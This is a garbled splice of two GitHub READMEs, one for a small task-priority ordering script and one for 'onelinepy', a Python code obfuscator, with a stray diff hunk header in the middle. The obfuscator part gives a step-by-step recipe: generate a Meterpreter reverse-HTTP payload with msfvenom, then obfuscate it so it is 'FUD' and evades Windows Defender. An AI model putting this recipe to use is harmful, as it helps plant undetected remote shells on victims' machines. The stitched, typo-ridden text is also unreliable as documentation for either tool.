# priority-order-decision


### Donwload & Run
git clone https://github.com/fackelm2/priority-order-decision
cd priority-order-decision
prorityorder

### Usage Guide
usage: priorityorder.py [-h] [-i INPUTFILE] [-o OUTPUTFILE]

optional arguments:
-h, --help    show this help message and exit
-i INPUTFILE  Input File
-o OUTUTFILE  Output File


# Ablauf
## input
working tasks (a, b, c, d, e, f, g)

## process
program ask for your priority (for example: a or b) for each entry

## output
order of working tasks with your priority (for example : e, b, c, a, f, g, d)


```sh
git clone https://github.com/spicesouls/onelinepy
cd onelinepy
python3 -m pip install -r requirements.txt
chmod +x oneline.py
./oneline.py
chmod +x setup.sh
./setup.sh
onelinepy
```

### Usage Guide
@@ -34,14 +34,26 @@ chmod +x oneline.py
<b>  --output OUTPUT  Output File.</b>
</pre>
### Examples
### Example: Creating FUD Meterpreter Python Payload
1. Generate Python Payload:
`msfvenom --payload python/meterpreter_reverse_http LHOST=... LPORT=... > payload.txt`
2. Obfustucate Payload
`onelinepy -m /one_line/base64 --script payload.txt -i 3 --output obfustucated_payload.txt`
3. Profit! The Obfustucated Payload works against Windows Defender.
### More Examples
```sh
./oneline.py -m /one_line/base64 --script payload.py -i 3
onelinepy -m /one_line/base64 --script payload.py -i 3
```
```sh
./oneline.py -m /one_line/hex --code "print('HEX!')"
onelinepy -m /one_line/hex --code "print('HEX!')"
```
### Obfustucation Method List
